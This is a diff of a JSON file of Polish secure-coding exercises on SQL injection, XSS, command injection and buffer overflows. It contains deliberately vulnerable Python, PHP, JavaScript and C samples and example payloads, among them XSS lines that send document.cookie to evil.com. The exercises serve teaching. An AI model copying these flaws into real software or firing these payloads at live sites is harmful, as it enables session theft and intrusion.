@@ -1,263 +1,261 @@
-{
-  "tasks": [
-    {
-      "topic": "SQL Injection",
-      "num": 1,
-      "difficulty": "easy",
-      "languages": [
-        "python"
-      ],
-      "description": "Poniższy kod realizuje logowanie użytkownika w aplikacji Python. Wskaż konkretną linijkę, w której występuje podatność SQL Injection. Następnie wyjaśnij, co się stanie, gdy atakujący poda jako login wartość ' OR '1'='1'.",
-      "files": [
-        {
-          "path": "root/sqli/script1.py",
-          "language": "python",
-          "content": "import sqlite3\n\ndef login(username, password):\n    conn = sqlite3.connect('app.db')\n    cur = conn.cursor()\n    query = \"SELECT id FROM users WHERE username='\" + username + \"' AND password='\" + password + \"'\"\n    cur.execute(query)\n    return cur.fetchone() is not None"
-        }
-      ]
-    },
-    {
-      "topic": "SQL Injection",
-      "num": 2,
-      "difficulty": "easy",
-      "languages": [
-        "python"
-      ],
-      "description": "Atakujący wpisuje w pole hasła wartość \"haslo' OR '1'='1\". Zakładając, że oryginalne zapytanie ma postać \"SELECT * FROM users WHERE user='X'\", Zapisz pełne zapytanie wynikowe po podstawieniu złośliwej wartości w miejscu 'X'."
-    },
-    {
-      "topic": "SQL Injection",
-      "num": 3,
-      "difficulty": "medium",
-      "languages": [
-        "python"
-      ],
-      "description": "Poniższy kod jest podatny na SQL Injection. Popraw go, stosując parametryzację zapytań z modułem sqlite3. ",
-      "files": [
-        {
-          "path": "root/sqli/script3.py",
-          "language": "python",
-          "content": "import sqlite3\n\ndef search_users(role):\n    conn = sqlite3.connect('app.db')\n    cur  = conn.cursor()\n    query = \"SELECT name, email FROM users \" \"WHERE role = '\" + role + \"'\"\n    cur.execute(query)\n    return cur.fetchall()"
-        }
-      ]
-    },
-    {
-      "topic": "SQL Injection",
-      "num": 4,
-      "difficulty": "medium",
-      "languages": [
-        "python"
-      ],
-      "description": "Przeanalizuj poniższe trzy implementacje funkcji pobierającej użytkownika po identyfikatorze. Dla każdej z nich określ czy jest podatna na SQL Injection, i jeżeli tak - przekształć podatną implementację na bezpieczną.",
-      "files": [
-        {
-          "path": "root/sqli/script4.py",
-          "language": "python",
-          "content": "# Implementacja A\ndef get_user_A(uid):\n    return db.execute(\"SELECT * FROM users WHERE id=\" + str(uid))\n\n# Implementacja B\ndef get_user_B(uid):\n    return db.execute(\"SELECT * FROM users WHERE id=?\", (uid,))\n\n# Implementacja C\ndef get_user_C(uid):\n    return db.execute(\"SELECT * FROM users WHERE id=%s\" % uid)"
-        }
-      ]
-    },
-    {
-      "topic": "SQL Injection",
-      "num": 5,
-      "difficulty": "hard",
-      "languages": [
-        "python"
-      ],
-      "description": "Napisz od podstaw w Pythonie funkcję register_user(username, email, password), która:\n1. tworzy tabelę users o schemacie (id INTEGER PRIMARY KEY, username TEXT UNIQUE, email TEXT UNIQUE, password_hash TEXT, created_at TEST), jeżeli dotychczas nie istnieje\n2. hashuje hasło używając hashlib.pbkdf2_hmac z losową solą - sól musi być przechowywana z hasłem\nzapisuje dane za pomocą parametryzowanych zapytań sqlite3"
-    },
-    {
-      "topic": "SQL Injection",
-      "num": 6,
-      "difficulty": "hard",
-      "languages": [
-        "python"
-      ],
-      "description": "Poniższy kod zawiera podatność Second-Order SQL Injection - rodzaj ataku, w którym złośliwe dane są najpierw bezpiecznie zapisane do bazy, lecz następnie pobrane i użyte w nowym, niezabezpieczonym zapytaniu. Wyjaśnij mechanizm ataku, zapisz w komentarzu przykład złośliwej nazwy użytkownika umożliwiającej atak i wprowadź poprawkę zabezpieczającą kod.",
-      "files": [
-        {
-          "path": "root/sqli/script6.py",
-          "language": "python",
-          "content": "import sqlite3\n\ndef register(username, password):\n    db.execute(\"INSERT INTO users (name, pass) VALUES (?,?)\",(username, password))\ndef update_email(current_user, new_email):\n    row = db.execute(\"SELECT name FROM users WHERE name=?\",(current_user,)).fetchone()\n    query = \"UPDATE users SET email='\" + new_email + \"' WHERE name='\" + row['name'] + \"'\"\n    db.execute(query)"
-        }
-      ]
-    },
-    {
-      "topic": "Cross-Site Scripting (XSS)",
-      "num": 1,
-      "difficulty": "easy",
-      "languages": [
-        "Node.js"
-      ],
-      "description": "Czy poniższy kod Node.js/Express zawiera podatność XSS? Jeśli tak - wskaż konkretną linię. Jeżeli nie, wpisz NIE. Zastanów się, jaki payload sprawiłby wypisanie alert(1) w przeglądarce ofiary.",
-      "files": [
-        {
-          "path": "root/xss/script1.js",
-          "language": "Node.js",
-          "content": "app.get('/search', (req, res) => {\n  const q = req.query.q || '';\n  res.send(`\n    <html>\n      <body>\n        <h2>Wyniki dla: ${q}</h2>\n      </body>\n    </html>\n  `);\n});"
-        }
-      ]
-    },
-    {
-      "topic": "Cross-Site Scripting (XSS)",
-      "num": 2,
-      "difficulty": "easy",
-      "languages": [
-        "HTML"
-      ],
-      "description": "Poniżej podano pięć ciągów znaków. Wskaż po kolei, które z nich mogą pełnić rolę skutecznego payloadu XSS w kontekście strony HTML.",
-      "files": [
-        {
-          "path": "root/xss/script2.txt",
-          "language": "txt",
-          "content": "1) <script>document.location='http://evil.com/?c='+document.cookie</script>\n\n2) <img src=x onerror=\"fetch('http://evil.com/?c='+document.cookie)\">\n\n3) <b>pogrubiony tekst</b>\n\n4) <a href=\"javascript:alert(document.domain)\">Kliknij</a>\n\n5) '; SELECT * FROM users; --"
-        }
-      ]
-    },
-    {
-      "topic": "Cross-Site Scripting (XSS)",
-      "num": 3,
-      "difficulty": "medium",
-      "languages": [
-        "PHP"
-      ],
-      "description": "Poniższy kod PHP wyświetla komentarz podany przez użytkownika bez żadnej sanityzacji. Popraw go, stosując funkcję htmlspecialchars() z odpowiednimi flagami. Zastanów się, które znaki specjalne są kodowane, jak wyglądają ich zakodowane odpowiedniki oraz dlaczego samo usunięcie <script> (blacklisting) jest niewystarczające.",
-      "files": [
-        {
-          "path": "root/xss/script3.php",
-          "language": "PHP",
-          "content": "<?php\n  $comment = $_GET['comment'];\n  echo \"<div class='comment'>\" . $comment . \"</div>\";\n?>"
-        }
-      ]
-    },
-    {
-      "topic": "Cross-Site Scripting (XSS)",
-      "num": 4,
-      "difficulty": "medium",
-      "languages": [
-        "python"
-      ],
-      "description": "Przeanalizuj poniższy kod JavaScript pod kątem podatności DOM-based XSS. Wyjaśnij sobie, dlaczego kod jest podatny, zauważ konkretną linię. Popraw kod, zastępując innerHTML bezpieczną alternatywą i wyjaśnij, dlaczego ta zmiana eliminuje podatność.",
-      "files": [
-        {
-          "path": "root/xss/script4.js",
-          "language": "JavaScript",
-          "content": "const params = new URLSearchParams(location.search);\nconst user   = params.get('name');\n\ndocument.getElementById('greeting').innerHTML = 'Witaj, ' + user + '!';"
-        }
-      ]
-    },
-    {
-      "topic": "Command Injection",
-      "num": 1,
-      "difficulty": "easy",
-      "languages": [
-        "python"
-      ],
-      "description": "Czy poniższy kod Python zawiera podatność Command Injection? Odpowiedz TAK lub NIE.",
-      "files": [
-        {
-          "path": "root/comi/script1.py",
-          "language": "python",
-          "content": "import subprocess\nfrom flask import request, jsonify\n\n@app.route('/ping')\ndef ping():\n    host = request.args.get('host', '')\n    result = subprocess.run(\n        ['ping', '-c', '1', host],\n        capture_output=True,\n        text=True,\n        timeout=5\n    )\n    return jsonify({'output': result.stdout})"
-        }
-      ]
-    },
-    {
-      "topic": "Command Injection",
-      "num": 2,
-      "difficulty": "easy",
-      "languages": [
-        "python"
-      ],
-      "description": "Wskaż podatną linię w poniższym kodzie i wyjaśnij, dlaczego jest niebezpieczna. Zastanów się jak mogły by wyglądać dwa różne przykładowe payloady (używające różnych separatorów poleceń), które pozwoliłyby atakującemu:\n    (a) wyświetlić listę plików w katalogu bieżącym,\n    (b) odczytać plik /etc/hostname.",
-      "files": [
-        {
-          "path": "root/comi/script2.py",
-          "language": "python",
-          "content": "import os\nfrom flask import request\n\n@app.route('/convert')\ndef convert():\n    filename = request.args.get('file', '')\n    os.system(\n        f\"convert {filename} -resize 200x200 thumb.jpg\"\n    )\n    return \"Gotowe\""
-        }
-      ]
-    },
-    {
-      "topic": "Command Injection",
-      "num": 3,
-      "difficulty": "medium",
-      "languages": [
-        "PHP"
-      ],
-      "description": "Poniższy kod PHP wykonuje polecenie ping na adresie IP podanym przez użytkownika. Popraw go, stosując:\n1. funkcję escapeshellarg() do ucieczki argumentu;\n2. walidację wejścia wyrażeniem regularnym akceptującym wyłącznie adresy IPv4 w formacie X.X.X.X.",
-      "files": [
-        {
-          "path": "root/comi/script3.php",
-          "language": "python",
-          "content": "<?php\n  $ip  = $_POST['ip'];\n  $out = shell_exec(\"ping -c 4 \" . $ip);\n  echo \"<pre>\" . $out . \"</pre>\";\n?>"
-        }
-      ]
-    },
-    {
-      "topic": "Command Injection",
-      "num": 4,
-      "difficulty": "hard",
-      "languages": [
-        "python"
-      ],
-      "description": "Napisz w Java funkcję public String safeWhois(String domain), która:\n1. wykonuje polecenie whois na podanej domenie;\n2. ProcessBuilder z ArrayList argumentów;\n3. waliduje domenę wyrażeniem regularnym akceptującym wyłącznie litery, cyfry, myślniki i kropki (a odrzuca wszelkie znaki specjalne powłoki)."
-    },
-    {
-      "topic": "Buffer Overflow",
-      "num": 1,
-      "difficulty": "easy",
-      "languages": [
-        "C"
-      ],
-      "description": "Wskaż wszystkie linie z niebezpiecznym wywołania funkcji w poniższym kodzie C. Dla każdego z nich:\n  (a) przypomnij sobie, dlaczego jest niebezpieczne i co może spowodować atak przepełnienia buforu.",
-      "files": [
-        {
-          "path": "root/buffer/script1",
-          "language": "C",
-          "content": "#include <stdio.h>\n2  #include <string.h>\n3   \n4  void process(char *input) {\n5      char buf[64];\n6      strcpy(buf, input);\n7      printf(buf); \n8  }\n9   \n10 int main() {\n11     char data[256];\n12     gets(data); \n13     process(data);\n14     return 0;\n15 }"
-        }
-      ]
-    },
-    {
-      "topic": "Buffer Overflow",
-      "num": 2,
-      "difficulty": "easy",
-      "languages": [
-        "C"
-      ],
-      "description": "Dla poprzedniego przykładu, napisz kod który będzie odporny na atak przepełnienia buforu."
-    },
-    {
-      "topic": "Buffer Overflow",
-      "num": 3,
-      "difficulty": "medium",
-      "description": "Przeanalizuj poniższy układ stosu dla\n    funkcji vulnerable() i opisz krok po kroku atak\n    Stack-based Buffer Overflow:\n    \n[ wyzsze adresy pamiec ]\n+----------------------+\n|  buf[64]             |  <-- bufor lokalny (64 bajty)\n+----------------------+\n|  zachowany EBP (4B)  |\n+----------------------+\n|  adres powrotu       |  <-- cel nadpisania (RET)\n+----------------------+\n[ nizsze adresy pamieci ]\n     Odpowiedz sobie na pytania:\n         -Co się dzieje, gdy wpisujemy dokładnie 64 bajty?\n        -Co się dzieje, gdy wpisujemy 72 bajty?\n        -Co umożliwia wpisanie więcej niż 72 bajtów zawierających adres kontrolowany przez atakującego?"
-    },
-    {
-      "topic": "Buffer Overflow",
-      "num": 4,
-      "difficulty": "medium",
-      "languages": [
-        "C"
-      ],
-      "description": "Poniższy kod C zawiera podatność\n    Buffer Overflow. Popraw go, stosując strncpy\n    z właściwą długością i ręcznym zerowaniem bajtu terminatora.\n    Zwróć szczególną uwagę na układ zmiennych na stosie: wyjaśnij,\n    co mogłoby się stać z wartością zmiennej authenticated,\n    gdyby atakujący podał hasło dłuższe niż 16 znaków.",
-      "files": [
-        {
-          "path": "root/buffer/script2",
-          "language": "C",
-          "content": "#include <stdio.h>\n#include <string.h>\n \nvoid authenticate(char *input_pass) {\n    int  authenticated = 0;\n    char stored[16]    = \"tajne123\";\n    char input[16];\n \n    strcpy(input, input_pass);\n \n    if (strcmp(input, stored) == 0)\n        authenticated = 1;\n \n    if (authenticated)\n        printf(\"Dostep przyznany!\\n\");\n    else\n        printf(\"Bledne haslo.\\n\");\n}"
-        }
-      ]
-    },
-    {
-      "topic": "Buffer Overflow",
-      "num": 5,
-      "difficulty": "hard",
-      "languages": [
-        "C"
-      ],
-      "description": "Napisz program w C demonstrujący podatność\n    Off-by-One Buffer Overflow\n        - Zdefiniuj dwie zmienne lokalne obok siebie: bufor char buf[8] oraz flagę int flag = 0;\n        - Napisz pętlę kopiującą, która sprawdza i <= 8 zamiast i < 8 (błąd o jeden bajt), i skopiuj do buforu ciąg 9 znaków;\n         - Wypisz wartość flag przed i po kopiowaniu;"
-    }
-  ]
-}
+[
+  {
+    "topic": "SQL Injection",
+    "num": 1,
+    "difficulty": "easy",
+    "languages": [
+      "python"
+    ],
+    "description": "Poniższy kod realizuje logowanie użytkownika w aplikacji Python. Wskaż konkretną linijkę, w której występuje podatność SQL Injection. Następnie wyjaśnij, co się stanie, gdy atakujący poda jako login wartość ' OR '1'='1'.",
+    "files": [
+      {
+        "path": "root/sqli/script1.py",
+        "language": "python",
+        "content": "import sqlite3\n\ndef login(username, password):\n    conn = sqlite3.connect('app.db')\n    cur = conn.cursor()\n    query = \"SELECT id FROM users WHERE username='\" + username + \"' AND password='\" + password + \"'\"\n    cur.execute(query)\n    return cur.fetchone() is not None"
+      }
+    ]
+  },
+  {
+    "topic": "SQL Injection",
+    "num": 2,
+    "difficulty": "easy",
+    "languages": [
+      "python"
+    ],
+    "description": "Atakujący wpisuje w pole hasła wartość \"haslo' OR '1'='1\". Zakładając, że oryginalne zapytanie ma postać \"SELECT * FROM users WHERE user='X'\", Zapisz pełne zapytanie wynikowe po podstawieniu złośliwej wartości w miejscu 'X'."
+  },
+  {
+    "topic": "SQL Injection",
+    "num": 3,
+    "difficulty": "medium",
+    "languages": [
+      "python"
+    ],
+    "description": "Poniższy kod jest podatny na SQL Injection. Popraw go, stosując parametryzację zapytań z modułem sqlite3. ",
+    "files": [
+      {
+        "path": "root/sqli/script3.py",
+        "language": "python",
+        "content": "import sqlite3\n\ndef search_users(role):\n    conn = sqlite3.connect('app.db')\n    cur  = conn.cursor()\n    query = \"SELECT name, email FROM users \" \"WHERE role = '\" + role + \"'\"\n    cur.execute(query)\n    return cur.fetchall()"
+      }
+    ]
+  },
+  {
+    "topic": "SQL Injection",
+    "num": 4,
+    "difficulty": "medium",
+    "languages": [
+      "python"
+    ],
+    "description": "Przeanalizuj poniższe trzy implementacje funkcji pobierającej użytkownika po identyfikatorze. Dla każdej z nich określ czy jest podatna na SQL Injection, i jeżeli tak - przekształć podatną implementację na bezpieczną.",
+    "files": [
+      {
+        "path": "root/sqli/script4.py",
+        "language": "python",
+        "content": "# Implementacja A\ndef get_user_A(uid):\n    return db.execute(\"SELECT * FROM users WHERE id=\" + str(uid))\n\n# Implementacja B\ndef get_user_B(uid):\n    return db.execute(\"SELECT * FROM users WHERE id=?\", (uid,))\n\n# Implementacja C\ndef get_user_C(uid):\n    return db.execute(\"SELECT * FROM users WHERE id=%s\" % uid)"
+      }
+    ]
+  },
+  {
+    "topic": "SQL Injection",
+    "num": 5,
+    "difficulty": "hard",
+    "languages": [
+      "python"
+    ],
+    "description": "Napisz od podstaw w Pythonie funkcję register_user(username, email, password), która:\n1. tworzy tabelę users o schemacie (id INTEGER PRIMARY KEY, username TEXT UNIQUE, email TEXT UNIQUE, password_hash TEXT, created_at TEST), jeżeli dotychczas nie istnieje\n2. hashuje hasło używając hashlib.pbkdf2_hmac z losową solą - sól musi być przechowywana z hasłem\nzapisuje dane za pomocą parametryzowanych zapytań sqlite3"
+  },
+  {
+    "topic": "SQL Injection",
+    "num": 6,
+    "difficulty": "hard",
+    "languages": [
+      "python"
+    ],
+    "description": "Poniższy kod zawiera podatność Second-Order SQL Injection - rodzaj ataku, w którym złośliwe dane są najpierw bezpiecznie zapisane do bazy, lecz następnie pobrane i użyte w nowym, niezabezpieczonym zapytaniu. Wyjaśnij mechanizm ataku, zapisz w komentarzu przykład złośliwej nazwy użytkownika umożliwiającej atak i wprowadź poprawkę zabezpieczającą kod.",
+    "files": [
+      {
+        "path": "root/sqli/script6.py",
+        "language": "python",
+        "content": "import sqlite3\n\ndef register(username, password):\n    db.execute(\"INSERT INTO users (name, pass) VALUES (?,?)\",(username, password))\ndef update_email(current_user, new_email):\n    row = db.execute(\"SELECT name FROM users WHERE name=?\",(current_user,)).fetchone()\n    query = \"UPDATE users SET email='\" + new_email + \"' WHERE name='\" + row['name'] + \"'\"\n    db.execute(query)"
+      }
+    ]
+  },
+  {
+    "topic": "Cross-Site Scripting (XSS)",
+    "num": 1,
+    "difficulty": "easy",
+    "languages": [
+      "Node.js"
+    ],
+    "description": "Czy poniższy kod Node.js/Express zawiera podatność XSS? Jeśli tak - wskaż konkretną linię. Jeżeli nie, wpisz NIE. Zastanów się, jaki payload sprawiłby wypisanie alert(1) w przeglądarce ofiary.",
+    "files": [
+      {
+        "path": "root/xss/script1.js",
+        "language": "Node.js",
+        "content": "app.get('/search', (req, res) => {\n  const q = req.query.q || '';\n  res.send(`\n    <html>\n      <body>\n        <h2>Wyniki dla: ${q}</h2>\n      </body>\n    </html>\n  `);\n});"
+      }
+    ]
+  },
+  {
+    "topic": "Cross-Site Scripting (XSS)",
+    "num": 2,
+    "difficulty": "easy",
+    "languages": [
+      "HTML"
+    ],
+    "description": "Poniżej podano pięć ciągów znaków. Wskaż po kolei, które z nich mogą pełnić rolę skutecznego payloadu XSS w kontekście strony HTML.",
+    "files": [
+      {
+        "path": "root/xss/script2.txt",
+        "language": "txt",
+        "content": "1) <script>document.location='http://evil.com/?c='+document.cookie</script>\n\n2) <img src=x onerror=\"fetch('http://evil.com/?c='+document.cookie)\">\n\n3) <b>pogrubiony tekst</b>\n\n4) <a href=\"javascript:alert(document.domain)\">Kliknij</a>\n\n5) '; SELECT * FROM users; --"
+      }
+    ]
+  },
+  {
+    "topic": "Cross-Site Scripting (XSS)",
+    "num": 3,
+    "difficulty": "medium",
+    "languages": [
+      "PHP"
+    ],
+    "description": "Poniższy kod PHP wyświetla komentarz podany przez użytkownika bez żadnej sanityzacji. Popraw go, stosując funkcję htmlspecialchars() z odpowiednimi flagami. Zastanów się, które znaki specjalne są kodowane, jak wyglądają ich zakodowane odpowiedniki oraz dlaczego samo usunięcie <script> (blacklisting) jest niewystarczające.",
+    "files": [
+      {
+        "path": "root/xss/script3.php",
+        "language": "PHP",
+        "content": "<?php\n  $comment = $_GET['comment'];\n  echo \"<div class='comment'>\" . $comment . \"</div>\";\n?>"
+      }
+    ]
+  },
+  {
+    "topic": "Cross-Site Scripting (XSS)",
+    "num": 4,
+    "difficulty": "medium",
+    "languages": [
+      "python"
+    ],
+    "description": "Przeanalizuj poniższy kod JavaScript pod kątem podatności DOM-based XSS. Wyjaśnij sobie, dlaczego kod jest podatny, zauważ konkretną linię. Popraw kod, zastępując innerHTML bezpieczną alternatywą i wyjaśnij, dlaczego ta zmiana eliminuje podatność.",
+    "files": [
+      {
+        "path": "root/xss/script4.js",
+        "language": "JavaScript",
+        "content": "const params = new URLSearchParams(location.search);\nconst user   = params.get('name');\n\ndocument.getElementById('greeting').innerHTML = 'Witaj, ' + user + '!';"
+      }
+    ]
+  },
+  {
+    "topic": "Command Injection",
+    "num": 1,
+    "difficulty": "easy",
+    "languages": [
+      "python"
+    ],
+    "description": "Czy poniższy kod Python zawiera podatność Command Injection? Odpowiedz TAK lub NIE.",
+    "files": [
+      {
+        "path": "root/comi/script1.py",
+        "language": "python",
+        "content": "import subprocess\nfrom flask import request, jsonify\n\n@app.route('/ping')\ndef ping():\n    host = request.args.get('host', '')\n    result = subprocess.run(\n        ['ping', '-c', '1', host],\n        capture_output=True,\n        text=True,\n        timeout=5\n    )\n    return jsonify({'output': result.stdout})"
+      }
+    ]
+  },
+  {
+    "topic": "Command Injection",
+    "num": 2,
+    "difficulty": "easy",
+    "languages": [
+      "python"
+    ],
+    "description": "Wskaż podatną linię w poniższym kodzie i wyjaśnij, dlaczego jest niebezpieczna. Zastanów się jak mogły by wyglądać dwa różne przykładowe payloady (używające różnych separatorów poleceń), które pozwoliłyby atakującemu:\n    (a) wyświetlić listę plików w katalogu bieżącym,\n    (b) odczytać plik /etc/hostname.",
+    "files": [
+      {
+        "path": "root/comi/script2.py",
+        "language": "python",
+        "content": "import os\nfrom flask import request\n\n@app.route('/convert')\ndef convert():\n    filename = request.args.get('file', '')\n    os.system(\n        f\"convert {filename} -resize 200x200 thumb.jpg\"\n    )\n    return \"Gotowe\""
+      }
+    ]
+  },
+  {
+    "topic": "Command Injection",
+    "num": 3,
+    "difficulty": "medium",
+    "languages": [
+      "PHP"
+    ],
+    "description": "Poniższy kod PHP wykonuje polecenie ping na adresie IP podanym przez użytkownika. Popraw go, stosując:\n1. funkcję escapeshellarg() do ucieczki argumentu;\n2. walidację wejścia wyrażeniem regularnym akceptującym wyłącznie adresy IPv4 w formacie X.X.X.X.",
+    "files": [
+      {
+        "path": "root/comi/script3.php",
+        "language": "python",
+        "content": "<?php\n  $ip  = $_POST['ip'];\n  $out = shell_exec(\"ping -c 4 \" . $ip);\n  echo \"<pre>\" . $out . \"</pre>\";\n?>"
+      }
+    ]
+  },
+  {
+    "topic": "Command Injection",
+    "num": 4,
+    "difficulty": "hard",
+    "languages": [
+      "python"
+    ],
+    "description": "Napisz w Java funkcję public String safeWhois(String domain), która:\n1. wykonuje polecenie whois na podanej domenie;\n2. ProcessBuilder z ArrayList argumentów;\n3. waliduje domenę wyrażeniem regularnym akceptującym wyłącznie litery, cyfry, myślniki i kropki (a odrzuca wszelkie znaki specjalne powłoki)."
+  },
+  {
+    "topic": "Buffer Overflow",
+    "num": 1,
+    "difficulty": "easy",
+    "languages": [
+      "C"
+    ],
+    "description": "Wskaż wszystkie linie z niebezpiecznym wywołania funkcji w poniższym kodzie C. Dla każdego z nich:\n  (a) przypomnij sobie, dlaczego jest niebezpieczne i co może spowodować atak przepełnienia buforu.",
+    "files": [
+      {
+        "path": "root/buffer/script1",
+        "language": "C",
+        "content": "#include <stdio.h>\n2  #include <string.h>\n3   \n4  void process(char *input) {\n5      char buf[64];\n6      strcpy(buf, input);\n7      printf(buf); \n8  }\n9   \n10 int main() {\n11     char data[256];\n12     gets(data); \n13     process(data);\n14     return 0;\n15 }"
+      }
+    ]
+  },
+  {
+    "topic": "Buffer Overflow",
+    "num": 2,
+    "difficulty": "easy",
+    "languages": [
+      "C"
+    ],
+    "description": "Dla poprzedniego przykładu, napisz kod który będzie odporny na atak przepełnienia buforu."
+  },
+  {
+    "topic": "Buffer Overflow",
+    "num": 3,
+    "difficulty": "medium",
+    "description": "Przeanalizuj poniższy układ stosu dla\n    funkcji vulnerable() i opisz krok po kroku atak\n    Stack-based Buffer Overflow:\n    \n[ wyzsze adresy pamiec ]\n+----------------------+\n|  buf[64]             |  <-- bufor lokalny (64 bajty)\n+----------------------+\n|  zachowany EBP (4B)  |\n+----------------------+\n|  adres powrotu       |  <-- cel nadpisania (RET)\n+----------------------+\n[ nizsze adresy pamieci ]\n     Odpowiedz sobie na pytania:\n         -Co się dzieje, gdy wpisujemy dokładnie 64 bajty?\n        -Co się dzieje, gdy wpisujemy 72 bajty?\n        -Co umożliwia wpisanie więcej niż 72 bajtów zawierających adres kontrolowany przez atakującego?"
+  },
+  {
+    "topic": "Buffer Overflow",
+    "num": 4,
+    "difficulty": "medium",
+    "languages": [
+      "C"
+    ],
+    "description": "Poniższy kod C zawiera podatność\n    Buffer Overflow. Popraw go, stosując strncpy\n    z właściwą długością i ręcznym zerowaniem bajtu terminatora.\n    Zwróć szczególną uwagę na układ zmiennych na stosie: wyjaśnij,\n    co mogłoby się stać z wartością zmiennej authenticated,\n    gdyby atakujący podał hasło dłuższe niż 16 znaków.",
+    "files": [
+      {
+        "path": "root/buffer/script2",
+        "language": "C",
+        "content": "#include <stdio.h>\n#include <string.h>\n \nvoid authenticate(char *input_pass) {\n    int  authenticated = 0;\n    char stored[16]    = \"tajne123\";\n    char input[16];\n \n    strcpy(input, input_pass);\n \n    if (strcmp(input, stored) == 0)\n        authenticated = 1;\n \n    if (authenticated)\n        printf(\"Dostep przyznany!\\n\");\n    else\n        printf(\"Bledne haslo.\\n\");\n}"
+      }
+    ]
+  },
+  {
+    "topic": "Buffer Overflow",
+    "num": 5,
+    "difficulty": "hard",
+    "languages": [
+      "C"
+    ],
+    "description": "Napisz program w C demonstrujący podatność\n    Off-by-One Buffer Overflow\n        - Zdefiniuj dwie zmienne lokalne obok siebie: bufor char buf[8] oraz flagę int flag = 0;\n        - Napisz pętlę kopiującą, która sprawdza i <= 8 zamiast i < 8 (błąd o jeden bajt), i skopiuj do buforu ciąg 9 znaków;\n         - Wypisz wartość flag przed i po kopiowaniu;"
+  }
+]
